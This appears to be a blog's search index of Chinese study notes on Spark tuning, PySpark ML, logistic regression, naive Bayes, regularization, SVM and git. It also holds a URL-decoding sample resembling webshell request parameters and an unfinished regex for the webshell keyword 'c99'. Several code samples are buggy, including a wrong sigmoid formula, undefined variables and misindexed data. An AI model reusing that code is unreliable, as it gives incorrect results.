提高性能的算子使用filter之后进行coalesce操作通常对一个RDD执行filter算子过滤掉RDD中较多数据后（比如30%以上的数据），建议使用coalesce算子，手动减少RDD的partition数量，将RDD中的数据压缩到更少的partition中去。因为filter之后，RDD的每个partition中都会有很多数据被过滤掉，此时如果照常进行后续的计算，其实每个task处理的partition中的数据量并不是很多，有一点资源浪费，而且此时处理的task越多，可能速度反而越慢。因此用coalesce减少partition数量，将RDD中的数据压缩到更少的partition之后，只要使用更少的task即可处理完所有的partition。在某些场景下，对于性能的提升会有一定的帮助。 Shuffle​ 大多数spark作业的性能主要就消耗在shuffle环节，因为shuffle中包含了大量的磁盘IO、序列化、网络数据传输等操作。但是影响一个spark作业性能的主要因素还是代码开发、资源参数、以及数据倾斜，shuffle调优在优化spark作业性能中只能起较小的作用。 shuffle操作速度慢的原因 ​ Pyspark使用过程中的一些小Tips： 1、RDD.repartition(n)可以在最初对RDD进行分区操作，这个操作实际上是一个shuffle，可能比较耗时，但是如果之后的action比较多的话，可以减少下面操作的时间。其中的n值看cpu的个数，一般大于2倍cpu，小于1000。 2、Action不能够太多，每一次的action都会将以上的taskset划分一个job，这样当job增多，而其中task并不释放，会占用更多的内存，使得gc拉低效率。 3、在shuffle前面进行一个过滤，减少shuffle数据，并且过滤掉null值，以及空值。 4、groupBy尽量通过reduceBy替代。reduceBy会在work节点做一次reduce，在整体进行reduce，相当于做了一次hadoop中的combine操作，而combine操作和reduceBy逻辑一致，这个groupBy不能保证。 5、做join的时候，尽量用小RDD去join大RDD. 6、避免collect的使用。因为collect如果数据集超大的时候，会通过各个work进行收集，io增多，拉低性能，因此当数据集很大时要save到HDFS。 7、RDD如果后面使用迭代，建议cache，但是一定要估计好数据的大小，避免比cache设定的内存还要大，如果大过内存就会删除之前存储的cache，可能导致计算错误，如果想要完全的存储可以使用persist（MEMORY_AND_DISK），因为cache就是persist（MEMORY_ONLY）。 8、设置spark.cleaner.ttl，定时清除task，因为job的原因可能会缓存很多执行过去的task，所以定时回收可能避免集中gc操作拉低性能。 ​]]></content>
      <categories>
        <category>spark</category>
      </categories>
      <tags>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典机器学习算法——逻辑回归]]></title>
    <url>%2F2018%2F10%2F22%2F%E7%BB%8F%E5%85%B8%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%2F</url>
    <content type="text"><![CDATA[逻辑回归模型 ​ 逻辑回归算法是一种根据现有数据对分类边界线(Decision Boundary)建立回归公式，以此进行分类的模型。逻辑回归首先赋予每个特征相同的回归参数，然后使用梯度下降算法来不断优化各个回归参数，最终根据回归参数来对新样本进行进行预测。 注意：虽然名叫逻辑回归，但是实际上是一种分类模型 工作原理 12345每个回归系数初始化为 1重复 R 次: 计算整个数据集的梯度 使用 步长 x 梯度 更新回归系数的向量(梯度下降)返回回归系数 逻辑回归算法的特点 优点：计算代价低，可解释性强 缺点：容易欠拟合，分类精度可能不高 使用数据类型：数值型数据和标称型数据(只存在是和否两种结果的将数据) sigmod函数 ​ sigmod是一种近似的越阶函数，可以将任意的输入值，然后将其映射为0到1之间的值，其公式和函数图像如下图： ​ 在逻辑回归中先使用每个特征乘以一个回归系数，将其乘积作为sigmod函数中的z，即 ​ 然后将其得到的值用sigmod函数映射到0到1，可以理解为被分为1类的概率。 梯度上升算法 ​ 要找到某个函数的最大值，最好的方式就是沿着梯度方向不断地去寻找，如果梯度记做▽ ，则函数 f(x, y) 的梯度由下式表示: 这个梯度意味着要沿 x 的方向移动 ，沿 y 的方向移动 。其中，函数f(x, y) 必须要在待计算的点上有定义并且可微。下图是一个具体的例子。 ​ 上图展示了整个梯度上升的过程，梯度上升算法在到到每个点后都会从新估计移动的方向，而这个方向就是梯度方向，移动的速度大小由参数α控制。 训练过程 ​ 训练算法：使用梯度上升寻找最佳参数 123456&gt; 每个回归系数初始化为 1&gt; 重复 R 次:&gt; 计算整个数据集的梯度&gt; 使用 步长 x 梯度 更新回归系数的向量(梯度下降)&gt; 返回回归系数&gt; ​ 其中步长为超参数alpha，而梯度的计算如下： 即每个点的数据和其输入数据相同。因此权重的更新可以使用： ​ w:=w+α error x 其中α为常数步长，error为在当前参数值下与目标值的误差经过sigmod函数处理后的值，x为当当前样本的输入 123456789101112131415161718192021222324import numpy as npdef sigmod(x): return 1/1+np.exp(-x)def gradAscend(dataSet,labelSet,alpha,maxCycles): #将输入的数据转为向量格式 dataMat = np.mat(dataSet) labelMat = np.mat(labelSet).tramsponse() #获取输入数据的维度 m,n = np.shape(dataMat) #初始化回归系数 weights = np.ones((n,1)) #对回归系数进行迭代更新 for i in range(maxCycles): #计算使用当前回归系数LR的hx值，结果为(m,1)维向量 h = sigmod(dataMat*weights) #计算误差 error = labelMat-h #根据梯度进行回归系数更新 weights = weights + alpha*dataMat.transponse()*error return weights 随机梯度上升算法 ​ 随机梯度上升算法起到的作用和一般的梯度上升算法是一样的，只是由于一般的梯度上升算法在每次更新回归系数时需要遍历整个数据集，因此当数据量变动很大时，一般的梯度上升算法的时间消耗将会非常大，因此提出了每次只使用一个样本来进行参数更新的方式，随机梯度上升（下降）。 随机梯度上升算法的特点： ​ 1.每次参数更新只使用一个样本，速度快 ​ 2.可进行在线更新，是一个在线学习算法（也是由于每次回归系数更新只使用一个样本） 工作原理： 12345所有回归系数初始化为 1对数据集中每个样本 计算该样本的梯度 使用 alpha x gradient 更新回归系数值返回回归系数值 初步随机梯度下降代码： 1234567891011121314def stocgradAscend(dataSet,labelSet): #1.这里没有转换成矩阵的过程，整个过程完全都是在Numpy数据完成的 alpha = 0.01 m,n = np.shape(dataSet) weights = np.ones((n,1)) #2.回归系数更新过程中的h、error都是单个值，而在一般梯度上升算法中使用的是矩阵操作 for i in range(m): h = np.sigmod(dataSet[i]*weights) error = h - labelSet[i] weights = weights + alpha*error*dataSet[i] return weights 但是这种随机梯度上升算法在在实际的使用过程出现了参数最后难以收敛，最终结果周期性波动的问题，针对这种问题我们对这个问题将随机梯度下降做了下面两种优化 ​ 1.改进为 alpha 的值，alpha 在每次迭代的时候都会调整。另外，虽然 alpha 会随着迭代次数不断减少，但永远不会减小到 0，因为我们在计算公式中添加了一个常数项。 ​ ​ 2.修改randomIndex的值，从以前顺序的选择样本更改为完全随机的方式来选择用于回归系数的样本，每次随机从列表中选出一个值，然后从列表中删掉该值（再进行下一次迭代）。 最终版随机梯度下降： 1234567891011121314151617181920def stocgradAscend(dataSet,labelSet,numsIter=150): m,n = np.shape(dataSet) weights = np.ones(n,1) alpha = 0.01 for i in range(numsIter): #生成数据的索引 dataIndex = range(m) for i in range(m): #alpha会随着i和j的增大不断减小 alpha = 4/(i+j+1.0)+0.001 # alpha 会随着迭代不断减小，但永远不会减小到0，因为后边还有一个常数项0.0001 #生成随机选择要进行回归系数更新的数据索引号 randomIndex = np.random.uniform(0,len(dataIndex)) h = sigmod(np.sum(dataSet[dataIndex[randomIndex]]*weights)) error = h - dataSet[dataIndex[randomIndex]]*weights weights = weights + alpha*error*dataSet[dataIndex[randomIndex]] #在数据索引中删除 del(dataIndex[randomIndex]) return weights 预测过程 ​ LR模型的预测过程很简单，只需要根据训练过程训练出的参数，计算sigmod(w*x),如果这个值大于0.5，则分为1，反之则为0 123456def classfyLR:(inX,weights) prob = sigmod(np.sum(weights*inX)) if prob&gt;=0.5 return 1 else: return 0 注：这里的阈值其实是可以自行设定的 一些其他相关问题 1.LR模型和最大熵模型 ​ (1).logistic回归模型和最大熵模型都属于对数线性模型 ​ (2).当最大熵模型进行二分类时，最大熵模型就是逻辑回归模型 ​ (3) 学习他们的模型一般采用极大似估计或正则化的极大似然估计 ​ (4)二者可以形式化为无约束条件下的最优化问题 2.LR模型的多分类 ​ 逻辑回归也可以作用于多分类问题，对于多分类问题，处理思路如下：将多分类问题看做多个二分类，然后在各个sigmod得到的分数中区最大的值对应的类作为最终预测标签。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[概率图模型]]></title>
    <url>%2F2018%2F10%2F21%2F%E6%A6%82%E7%8E%87%E5%9B%BE%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[​ 概率图模型是用图来表示变量概率依赖关系的理论，结合概率论与图论的知识，利用图来表示与模型有关的变量的联合概率分布 ​ 基本概率图模型主要包括贝叶斯网络、马尔科夫网络和隐马尔科夫网络三种类型。 ​ 基本的Graphical Model 可以大致分为两个类别：贝叶斯网络(Bayesian Network)和马尔可夫随机场(Markov Random Field)。它们的主要区别在于采用不同类型的图来表达变量之间的关系：贝叶斯网络采用有向无环图(Directed Acyclic Graph)来表达因果关系，马尔可夫随机场则采用无向图(Undirected Graph)来表达变量间的相互作用。这种结构上的区别导致了它们在建模和推断方面的一系列微妙的差异。一般来说，贝叶斯网络中每一个节点都对应于一个先验概率分布或者条件概率分布，因此整体的联合分布可以直接分解为所有单个节点所对应的分布的乘积。而对于马尔可夫场，由于变量之间没有明确的因果关系，它的联合概率分布通常会表达为一系列势函数（potential function）的乘积。通常情况下，这些乘积的积分并不等于1，因此，还要对其进行归一化才能形成一个有效的概率分布——这一点往往在实际应用中给参数估计造成非常大的困难。 概率图模型的表示理论​ 概率图模型的表示由参数和结构两部分组成。根据边有无方向性，可分为下面三种： ​ a、有向图模型—贝叶斯网络 ​ b、无向图模型—马尔科夫网络 ​ c、局部有向模型—条件随机场和链图]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最优化问题]]></title>
    <url>%2F2018%2F10%2F21%2F%E6%9C%80%E4%BC%98%E5%8C%96%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[一、概述最优化问题主要分为 ​ 1.无约束优化问题 ​ 2.等式优化问题 ​ 3.含不等式优化问题 ​ 对于无约束问题常常使用的方法就是Fermat定理，即求取f(x)的倒数然后另其为0，可求得候选最优质，如果函数为凸函数则直接为最优值。 ​ 在求取有约束条件的优化问题时，拉格朗日乘子法（Lagrange Multiplier) 和KKT条件是非常重要的两个求取方法。二者各有其使用范围： ​ 拉格朗日乘子法：等式约束的最优化问题 ​ KTT条件：不等式约束下的最优化问题 对于一般的任意问题而言，这两种方法求得的解是使一组解成为最优解的必要条件，只有当原问题是凸问题的时候，求是求得的解是最优解的充分条件。 二、有约束最优化问题的求解​ 1.拉格朗日乘子法 ​ 对于等式约束，我们可以通过一个拉格朗日系数a 把等式约束和目标函数组合成为一个式子L(a, x) = f(x) + a*h(x), 这里把a和h(x)视为向量形式，a是横向量，h(x)为列向量，然后求取最优值，可以通过对L(a,x)对各个参数求导取零，联立等式进行求取。 ​ 2.KTT条件 ​ 对于含有不等式的约束条件最优化问题，我们可以把所有的不等式约束、等式约束和目标函数全部写为一个式子L(a, b, x)= f(x) + ag(x)+bh(x)，KKT条件是说最优值必须满足以下条件： L(a, b, x)对x求导为零； h(x) =0; a*g(x) = 0;（g(x)为不等式约束） 求取这三个等式之后就能得到候选最优值。]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习——正则化]]></title>
    <url>%2F2018%2F10%2F21%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%AD%A3%E5%88%99%E5%8C%96%2F</url>
    <content type="text"><![CDATA[正则化相关问题 1.实现参数的稀疏有什么好处吗？ 121.可以简化模型，避免过拟合。因为一个模型中真正重要的参数可能并不多，如果考虑所有的参数起作用，那么可以对训练数据可以预测的很好，但是对测试数据就只能呵呵了。2.参数变少可以使整个模型获得更好的可解释性。 2.参数值越小代表模型越简单吗？ 1是的。这是因为越复杂的模型，越是会尝试对所有的样本进行拟合，甚至包括一些异常样本点，这就容易造成在较小的区间里预测值产生较大的波动，这种较大的波动也反映了在这个区间里的导数很大，而只有较大的参数值才能产生较大的导数。因此复杂的模型，其参数值会比较大。 3.模型简单包括什么？ 121.参数少2.参数值小 4.从贝叶斯角度看L1和L2正则化分贝数与什么分布？ ​ 对于频率学派，认为要将参数θ作为未知的定值，而样本X是随机的，其着眼点在样本空间，参数θ虽然我们不知道是什么，但是他是固定的，我们需要通过随机产生的样本去估计这个参数，所以才有了最大似然估计这些方法。 ​ 对于贝叶斯学派，把参数θ也视为满足某一个分布的随机变量，而X是固定的，其着眼点在参数空间，固定的操作模式是通过参数的先验分布结合样本信息得到参数的后验分布，核心是 ​ L1正则化相当于先验分布是拉普拉斯分布，L2正则化相当于先验概率是正态分布。拉普拉斯分布的计算公式： 正态分布概率密度分布公式： 正则化 机器学习中几乎都可以看到损失函数后面会添加一个额外项，常用的额外项一般有两种，一般英文称作L1-norm和L2-norm，中文称作L1正则化和L2正则化，或者L1范数和L2范数。 对于线性回归模型，使用L1正则化的模型建叫做Lasso回归，使用L2正则化的模型叫做Ridge回归（岭回归） 概念： L1正则化是指权值向量绝对值之和，通常表示为||w||1 L2正则化是指全职向量w中各个元素的平方和让后再求平方根，通常表示为||w||2 下图是Python中Lasso回归的损失函数，式中加号后面一项α||w||1即为L1正则化项。 下图是Python中Ridge回归的损失函数，式中加号后面一项α||w||22 即为L2正则化项 注：1.上面的两个函数前半部分可以为任意的线性函数的损失函数，组合成的函数都可以成为Lasso回归会Ridge回归2.上面两个式子中的α为正则化系数，后续通过交叉验证确定 注：上面两个式子中的α为正则化系数，后续通过交叉验证确定) L1正则化与L2正则化的作用： L1正则化可产生稀疏权值矩阵，即产生一个稀疏模型，可用用于特征选择 L2正则化主要用于防止过拟合 L1正则化 L1正则化的标准形式： ​ 其中J0是原始的损失函数，加好后面是L1正则化项。机器学习的最终目就是找出损失函数的最小值，当我们在原本的损失函数后面加上L1正则化后，相当于对J0做了一个约束，另L1正则化项等于L，则 J=J0+L，任务转化为在L1的约束下求J0最小值的解。​ 考虑二维情况，即只有两个权值w1和w2，此时L=|w1|+|w2|，对于梯度下降算法，求解j0的过程中画出等值线，同时将L1正则化的函数L也在w1、w2空间化出来，二者图像首次相交处即为最优解，获得下图： ​ 从图中可看出j0与L相交于L的一个顶点处，这个顶点即为最优解。注意这个顶点的值为（w1,w2）=(0,w)，可以想象，在更多维的情况下，L将会有很多突出的角，而J与这些叫接触的几率将远大于与L其他部位接触的概率，而这些角上将会有许多权值为0，从而产生系数矩阵，进而用于特征选择。 1234567891011from sklearn.linear_model import Lassofrom sklearn.preprocessing import StandardScaler from sklearn.datasets import load_bostonboston=load_boston() scaler=StandardScaler() X=scaler.fit_transform(boston["data"])Y=boston["target"]names=boston["feature_names"]lasso=Lasso(alpha=.3)lasso.fit(X,Y)print"Lasso model: ",pretty_print_linear(lasso.coef_,names,sort=True) L2正则化 L2正则化的标准形式 ​ 和L1正则化相同，任务转化为在L2的约束下求J0最小值的解。考虑二维情况，即只有两个权值w1和w2，此时L=|w1|+|w2|，对于梯度下降算法，求解j0的过程中画出等值线，同时将L1正则化的函数L也在w1、w2空间化出来，二者图像首次相交处即为最优解，获得下图： 机器学习过程中权值尽可能小的原因： 试想对于一个模型，当参数很大时，只要数据偏移一点点，就会对结果造成很大的影响，如果参数较小，则数据偏移的多一点，也不会对结果产生多大的影响，抗扰动能力强 为什么L2正则化可以使权值尽可能的小? 对于损失函数不带L2正则化项的梯度下降时参数更新公式为： 加入L2正则化项，参数更新公式为： 根据两个公式之间的差别，我们可以明显的看到，加入正则化以后的梯度下降在进行参数更新时，要先将原有的参数值乘以一个小于1的值，因此权值也会变得比不带的参数小]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SVM模型]]></title>
    <url>%2F2018%2F10%2F19%2FSVM%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[1.SVM模型的超参数 ​ SVM模型主要包括C和gamma两个超参数。 ​ C是惩罚系数，也就是对误差的宽容度，C越大代表越不能容忍出现误差，越容易出现过拟合； ​ gamma是选择RBF核时，RBF核自带的一个参数，隐含的决定数据映射到新空间的后的分布，gamma越大，支持向量越少。 支持向量的个数影响训练和预测的个数 gamma的物理意义，大家提到很多的RBF的幅宽，它会影响每个支持向量对应的高斯的作用范围，从而影响泛化性能。我的理解：如果gamma设的太大,σ会很小，σ很小的高斯分布长得又高又瘦， 会造成只会作用于支持向量样本附近，对于未知样本分类效果很差，存在训练准确率可以很高，无穷小，则理论上，高斯核的SVM可以拟合任何非线性数据，但容易过拟合)而测试准确率不高的可能，就是通常说的过训练；而如果设的过小，则会造成平滑效应太大，无法在训练集上得到特别高的准确率，也会影响测试集的准确率 2.]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[流量解析过程中常用的一些工具]]></title>
    <url>%2F2018%2F10%2F12%2F%E6%B5%81%E9%87%8F%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[在实际流量解析过程中一般使用 1.url编码解码-urllib ​ python使用urllib包来进行url编码和解码，对于python3： 123456789101112import urllibrawurl="xxc=B&amp;z0=GB2312&amp;z1=%E4%B8%AD%E5%9B%BD"#python2url = url.unquote(rawurl)#python3url=urllib.parse.unquote(rawurl)output: 'xxc=B&amp;z0=GB2312&amp;z1=中国' 2.字符串转十六进制 ​ 字符串转十六进制可以分为两种：1.对于已经是十六进制格式，但是已经被转为字符串，例如：”” 123import binascii#python3 3.原始字节串和十六进制字节串之间的转化—binascii 12345678910import binasciidata_bytes = b"cfb5cdb3d5d2b2bbb5bdd6b8b6a8b5c4c2b7beb6a1a3"data_hex = b'\xcf\xb5\xcd\xb3\xd5\xd2\xb2\xbb\xb5\xbd\xd6\xb8\xb6\xa8\xb5\xc4\xc2\xb7\xbe\xb6\xa1\xa3'#原始字节串==&gt;十六进制字节串binascii.hexlify(data_bytes)#十六进制字节串==&gt;原始字节串binascii.unhexlify(data_bytes) ​ ​]]></content>
      <categories>
        <category>流量相关</category>
      </categories>
      <tags>
        <tag>流量相关</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用正则表达式]]></title>
    <url>%2F2018%2F10%2F10%2F%E5%B8%B8%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[1.匹配一个指定字符串，指定字符串前后不能有任何字母和数字内容 12#以c99关键字为例[]]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[概率图模型——朴素贝叶斯]]></title>
    <url>%2F2018%2F10%2F09%2F%E6%A6%82%E7%8E%87%E5%9B%BE%E6%A8%A1%E5%9E%8B%E2%80%94%E2%80%94%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%2F</url>
    <content type="text"><![CDATA[​ 逻辑回归通过拟合曲线实现分类，决策树通过寻找最佳划分特征进而学习样本路径实现分类，支持向量机通过寻找分类超平面进而最大化类间间隔实现分类，而朴素贝叶斯通过 朴素贝叶斯思想 ​ 朴素贝叶斯是一种最简单的概率图模型，通过根据训练样本统计出样本的概率分布，基于贝叶斯定理和条件独立假设来进行建模预测的模型。 朴素贝叶斯概率图 贝叶斯定理 12345678p(AB)=P(A/B)P(B) =P(B/A)P(A)在贝叶斯模型中用到的是下面的形式： P(Ci/W) = P(W|Ci)*P(Ci)/P(W)其中，W为向量，有的多个值组成，Ci为标签，也就是上式可以写成下面的形式 P(Ci/w0,w1,..,w) = P(w0,w1,...,wn/Ci)*P(Ci)/P(W)里面的P(Ci/w0,w1,..,w)就是机器学习建模最终的目标，在一定条件下是某一类的概率 条件独立假设 12345 条件独立假设认为：每个事件的发生都相互独立，互相之间没有影响。由于这个假设，上面的式子可以改为： P(Ci/w0,w1,..,w) = P(w0,w1,...,wn/Ci)/P(Ci) = P(w0/Ci)P(w1/Ci)...P(wn/Ci)*P(Ci)/p(W) 到这里，我们可以知道，要求的最终的结果，只需要在训练集中求得P(Ci)以及在P(w0/Ci)...P(wn/Ci)即可 模型训练 因此在NB算法训练时，只需要在训练集样本中到下面三个概率分布： ​ 1.P(Ci)，在训练集中标签1出现的概率(二分类只需要统计一个，n分类就需要n-1个) ​ 2.P(wj/Ci),在训练集中属于各个标签的条件下第n个特征是i的概率 注意：这里不需要统计P(W)的概率，因为最终属于各个类型的概率都需要除以相同的P(W)，因此约掉 训练代码： 123456789101112131415161718192021222324252627def trainNB(dataSetList,labels): dataSetVec = np.array(dataSetList) #计算Pc sampleNums = len(dataSetVec) pc = np.sum(datasetVec)/sampleNums #计算p(wj/Ci),这里是二分类 p0Nums = 0 p1Nums = 0 #这里涉及到初始化问题 p0Vecs = np.ones(len(dataSetVec[0])) p1Vecs = np.ones(len(dataSetVec[0])) for i in range(len(labels)): if labels[i]==0: p0Vecs += dataSetVec[0] p0Nums += 1 else: p1Vecs += dataSetVec[0] p1Nums += 1 p0Vecs = p0Vecs/p0Nums p1Vecs = p1Vecs/p1Nums return pc,p0Vecs,p1Vecs 初始化问题： ​ 再利用贝叶斯分类器进行分类时，要计算多个概率等乘积以计算文档属于某个分类的概率，即计算： ​ P(w0|c=1)P(w1|c=1)….P(wn|c=1) ​ 如果其中任意一项为0，那么最终的成绩也将等于0。为了降低这种情况造成的影响，可以将所有词初始化为1. 预测过程 ​ NB模型的预测过程就是使用上面统计得到的概率分布与输入数据进行关联后，计算出新的样本属于各个类型的概率，然后选择其中概率最大的类型作为模型预测类型的过程。预测过程中需要关注的一个关键问题需要重点关注，那就是python的下溢出问题。 ​ 下溢出问题：在python中当多个很小的数相乘时会产生下溢出问题(最后四舍五入得到0) ​ 解决办法：取自然对数。因为自然对数和原来的数怎增减性相同，极值点也相同 ​ 使用自然对数后，上面的式可以转换成： ​ P(Ci/w0,w1,..,w) = P(w0/Ci)P(w1/Ci)…P(wn/Ci)/P(Ci) —&gt;P(Ci/w0,w1,..,w) = log(P(w0/Ci))+…+log(P(wn/Ci))+P(Ci) 预测代码： ​ 预测过程中将已知的概率分布与输入数据进行关联的方式： ​ log(P(w0/Ci))+…+log(P(wn/Ci))+P(Ci) ——&gt;log(P(w0/Ci))x0+…+log(P(wn/Ci))xn+log(P(Ci) ​ 这里的input_data*np.log(p0Vecs)代表将每个出现的词和其出现在该类中出现该词的概率关联起来. 123456789def classfyNB(input_data,pc,p0Vecs,p1Vecs): #这里的input_data*np.log(p0Vecs)代表将每个出现的词和其出现在该类中出现该词的概率关联起来 #这里之所以没有除以pw，是因为对每个类型的pw是一致的，就没有必要所有都除了 p0 = sum(input_data*np.log(p0Vecs))+math.log(pc) p1 = sum(input_data*np.log(p1Vecs))+math.log(1-pc) if p0&gt;p1: return 0 else: return 1 ​]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[github基本使用]]></title>
    <url>%2F2018%2F10%2F03%2Fgithub%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[github相关知识： ​ github项目使用终端进行管理时分为三个区域：工作目录、暂存区（本地库）、github上的远程项目，当我们要更新以及操作一个项目时，要遵循以下的格式： 1.先从github上面pull下远程的项目分支 2.本地的项目文件夹中的文件进行更新（更新工作目录中的文件） 3.使用add将更新的索引添加到本地库 4.使用commit工作目录中的文件提交到暂存区(本地库) 5.将文件push到远程分支或merge到远程分支 基本操作 git clone “ssh项目地址” 克隆远程项目 git pull origin master 取回远程主机或本地的某个分支的更新，再与本地分支进行合并(这种写法是origin主机的master分支与本地当前分支进行合并) git push origin master 将本地的当前分支push到origin主机的master分支上 git add “文件名” 将指定文件提交到本地库 git commit -m “描述信息” 将本地的全部文件都提交到本地库 git log 打印该项目的版本操作信息 git status 查看到那个钱仓库状态 更新github 123456789101112131415161718192021222324252627282930313233343536373839#将项目从github上面拉下来(本地已经有的可以跳过,已有则直接进入该文件夹)git clone github链接#查看项目状态git statusoutput: On branch master Your branch is up to date with 'origin/master'. nothing to commit, working tree clean #创建或者导入新文件到工作区touch "文件1"#将文件工作目录的文件提交到暂存区git add "文件1" #提交指定文件git add -A #一次提交工作目录中的全部文件#查看项目状态 git status #第一次提交描述时需要设置账户信息git config --global user.name "John Doe"git config --global user.email johndoe@example.com#添加描述git commit -m "此次添加的描述信息"#查看项目状态git status output: On branch master Your branch is ahead of 'origin/master' by 1 commit. (use "git push" to publish your local commits)#将修改从暂存区提交到远程分支git push origin master 删除已经提交到github上面的文件 123456789#在本地拉取远程分支git pull original master#在本地删除对应的文件git rm filename#添加描述上传到远程分支git commit -m "删除文件filename"git push original master 已经提交到github上的文件进行版本回退 12345678910#先通过git log获取版本号git log#然后使用git revert 版本号来回退到指定版本git retvert 版本号#然后:x保存退出就可以了撤回到指定的版本了#最后再将本地分支push到github上git push origin master 分支切换 123456git checkout ... #创建分支git checkout -b ... #创建并且换到分支git checkout ... #切换到分支 12345git branch #查看本地分支git branch -a #查看本地和远程的全部分支git push origin --delete dev2 #删除远程分支]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pyspark ML库]]></title>
    <url>%2F2018%2F09%2F30%2Fpyspark-ML%E5%BA%93%2F</url>
    <content type="text"><![CDATA[​ pyspark的ML软件包主要用于针对spark dataframe的建模（MLlib主要还是针对RDD，准备废弃）,ML包主要包含了转化器Transformer、评估器Estimater和管道Pipline三个部分。 1.转化器​ 转换器通常通过将一个新列附加到DataFrame来转化数据，每个转化器都必须实现.transform()方法。 ​ 使用在预处理截断 .transorm()方法常用的参数： ​ 1.dataframe 这是唯一一个强制性参数（也可以不理解为参数） ​ 2.inputCol 输入列名 ​ 3.outputCol 输出列名 ​ 要使用转化器首先需要引入宝feature 1from pyspark.ml.feature import ... (1)Binarizer ​ 根据指定阈值将连续变量进行二值化 注：这里需要输入的那一列的数据类型为DoubleType,InterType和FloatType都不支持 1234567891011121314df = spark.createDataFrame([[2.0,'a'],[1.0,'b'],[4.0,'b'],[9.0,'b'],[4.3,'c']],schema=schema)binarizer = Binarizer(threshold=4.0,inputCol='id',outputCol='binarizer_resulit')binarizer.transform(df).show()output: +---+---+-----------------+ | id|age|binarizer_resulit| +---+---+-----------------+ |2.0| a| 0.0| |1.0| b| 0.0| |4.0| b| 0.0| #当值与阈值相同的时候向下取 |9.0| b| 1.0| |4.3| c| 1.0| +---+---+-----------------+ (2)Bucketizer ​ 根据阈值列表将连续变量值离散化 注：splits一定要能包含该列所有值 1234567891011121314df = spark.createDataFrame([[2.0,'a'],[1.0,'b'],[4.0,'b'],[9.0,'b'],[4.3,'c']],schema=schema)bucketizer = Bucketizer(splits=[0,2,4,10],inputCol='id',outputCol='bucketizer_result')bucketizer.setHandleInvalid("keep").transform(df).show()output: +---+---+-----------------+ | id|age|bucketizer_result| +---+---+-----------------+ |2.0| a| 1.0| |1.0| b| 0.0| |4.0| b| 2.0| |9.0| b| 2.0| |4.3| c| 2.0| +---+---+-----------------+ (3)QuantileDiscretizer ​ 根据数据的近似分位数来将离散变量转化来进行离散化 1234567891011121314df = spark.createDataFrame([[2.0,'a'],[1.0,'b'],[4.0,'b'],[9.0,'b'],[4.3,'c']],schema=schema)quantile_discretizer = QuantileDiscretizer(numBuckets=3,inputCol='id',outputCol='quantile_discretizer_result')bucketizer.setHandleInvalid("keep").transform(df).show()output: +---+---+-----------------+ | id|age|bucketizer_result| +---+---+-----------------+ |2.0| a| 1.0| |1.0| b| 0.0| |4.0| b| 2.0| |9.0| b| 2.0| |4.3| c| 2.0| +---+---+-----------------+ (4)Ngram ​ 将一个字符串列表转换为ngram列表，以空格分割两个词,一般要先使用算法来先分词，然后再进行n-gram操作。 注：1.空值将被忽略，返回一个空列表 ​ 2.输入的列必须为一个ArrayType(StringType()) 1234567df = spark.createDataFrame([ [['a','b','c','d','e']], [['s','d','u','y']]],['word'])ngram = NGram(n=2,inputCol="word",outputCol="ngram_result")ngram.transform(df).show() (5)RegexTokener ​ 正则表达式分词器，用于将一个字符串根据指定的正则表达式来进行分词。 参数包括： ​ pattern：用于指定分词正则表达式，默认为遇到任何空白字符则分词 ​ minTokenLength: 最小分词长度过滤，小于这个长度则过滤掉 12 (6)VectorIndexer ​ VectorIndexer是对数据集特征向量中的类别（离散值）特征进行编号。它能够自动判断那些特征是离散值型的特征，并对他们进行编号，具体做法是通过设置一个maxCategories，特征向量中某一个特征不重复取值个数小于maxCategories，则被重新编号为0～K（K&lt;=maxCategories-1）。某一个特征不重复取值个数大于maxCategories，则该特征视为连续值，不会重新编号 主要作用：提升决策树、随机森林等ML算法的效果 参数： ​ 1.MaxCategories 是否被判为离散类型的标准 ​ 2.inputCol 输入列名 ​ 3.outputCol 输出列名 12345678910111213141516171819+-------------------------+-------------------------+|features |indexedFeatures 